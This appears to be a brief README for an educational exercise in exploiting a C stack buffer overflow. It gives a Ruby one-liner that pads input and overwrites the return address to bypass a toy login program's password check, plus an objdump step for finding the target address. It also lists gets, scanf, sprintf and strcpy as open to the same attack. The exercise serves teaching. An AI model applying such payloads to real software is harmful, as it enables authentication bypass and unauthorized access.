# BufferOverlow
Exploitation of buffer overflow in C language
Accessing the a function bypassing IF-ELSE condition which acts as a gateway. the structure is of login portal with username and password.To access the function the address of the particulat function is needed.
Here the address is
```cmd
ruby -e 'print "a"*32 + "\x60\x14\x40\x00"' | buffer.exe
```
This address may not be the same in all cases and depends on compilers.So check the address in the disassemble of executable file.
```cmd
objdump -d buffer.exe > diss.asm
```
There you can find the  address of function program().
In this program the scanf is used but the same exploit can be done in 
1. gets
2. scanf
3. sprintf
4. strcpy
